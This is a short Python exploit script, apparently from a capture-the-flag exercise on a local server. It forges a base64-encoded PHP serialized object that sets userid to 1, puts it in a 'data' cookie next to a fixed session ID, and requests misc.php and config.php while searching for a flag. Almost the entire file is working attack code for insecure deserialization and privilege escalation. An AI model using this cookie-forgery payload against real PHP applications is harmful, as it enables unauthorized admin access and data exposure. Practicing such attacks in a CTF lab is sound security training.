import base64
import urllib.parse
import requests
import re

# Target URL
base_url = "http://127.0.0.1:33127"

# Focus on the most promising payload - changing userid to 1 (likely admin)
payload = 'O:11:"UserProfile":2:{s:6:"userid";i:1;s:8:"username";s:8:"testuser";}'

# Encode the payload
b64_encoded = base64.b64encode(payload.encode()).decode()
url_encoded = urllib.parse.quote(b64_encoded)

# Create cookies with modified data
cookies = {
    'data': url_encoded,
    'PHPSESSID': 'ca3885931b3dde5fc7c90d5b9f0754d6'
}

print("Testing PHP insecure deserialization exploit")
print("=" * 50)
print(f"Original payload: {payload}")
print(f"Base64 encoded: {b64_encoded}")
print(f"URL encoded: {url_encoded}")
print()

# Try to access /misc.php with modified cookie
print(f"[>] Accessing {base_url}/misc.php with modified cookie...")
response = requests.get(f"{base_url}/misc.php", cookies=cookies, timeout=15)

print(f"[>] Status Code: {response.status_code}")
print(f"[>] Content Length: {len(response.content)} bytes")
print(f"[>] Response Headers: {dict(response.headers)}")
print()

if response.text.strip():
    print("[>] RESPONSE CONTENT:")
    print("-" * 50)
    print(response.text)
    print("-" * 50)
    
    # Check for FLAG pattern
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag_match:
        print(f"[!] FLAG FOUND: {flag_match.group(0)}")
    else:
        print("[i] No flag found in response")
else:
    print("[i] Response is empty (content-length: 0)")

print()

# Also try config.php to see if we get anything there
print(f"[>] Accessing {base_url}/config.php with same cookie...")
response2 = requests.get(f"{base_url}/config.php", cookies=cookies, timeout=15)

print(f"[>] Status Code: {response2.status_code}")
print(f"[>] Content Length: {len(response2.content)} bytes")

if response2.text.strip():
    print("[>] CONFIG.PHP RESPONSE:")
    print("-" * 50)
    print(response2.text)
    print("-" * 50)
    
    # Check for FLAG pattern in config
    flag_match2 = re.search(r'FLAG\{[^}]+\}', response2.text)
    if flag_match2:
        print(f"[!] FLAG FOUND in config.php: {flag_match2.group(0)}")
else:
    print("[i] config.php response is empty")
